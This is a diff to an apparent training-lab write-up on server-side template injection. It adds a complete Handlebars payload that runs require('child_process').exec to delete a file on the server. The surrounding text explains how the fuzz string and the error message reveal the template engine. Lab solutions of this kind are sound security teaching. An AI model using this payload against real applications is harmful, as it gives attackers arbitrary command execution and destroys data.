@@ -60,4 +60,23 @@ This lab is vulnerable to server-side template injection. To solve the lab, iden
 ## Solution
 Notice that when you try to view more details about the first product, a `GET` request uses the `message` parameter to render `"Unfortunately this product is out of stock"` on the home page. Experiment by injecting a fuzz string containing template syntax from various different template languages, such as `${{<%[%'"}}%\`, into the `message` parameter. Notice that when you submit invalid syntax, an error message is shown in the output. This identifies that the website is using Handlebars. Search the web for "Handlebars server-side template injection". You should find a well-known exploit posted by `@Zombiehelp54`. Modify this exploit so that it calls `require("child_process").exec("rm /home/carlos/morale.txt")` as follows:
 ```
+wrtz{{#with "s" as |string|}}
+    {{#with "e"}}
+        {{#with split as |conslist|}}
+            {{this.pop}}
+            {{this.push (lookup string.sub "constructor")}}
+            {{this.pop}}
+            {{#with string.split as |codelist|}}
+                {{this.pop}}
+                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+                {{this.pop}}
+                {{#each conslist}}
+                    {{#with (string.sub.apply 0 codelist)}}
+                        {{this}}
+                    {{/with}}
+                {{/each}}
+            {{/with}}
+        {{/with}}
+    {{/with}}
+{{/with}}
 ```
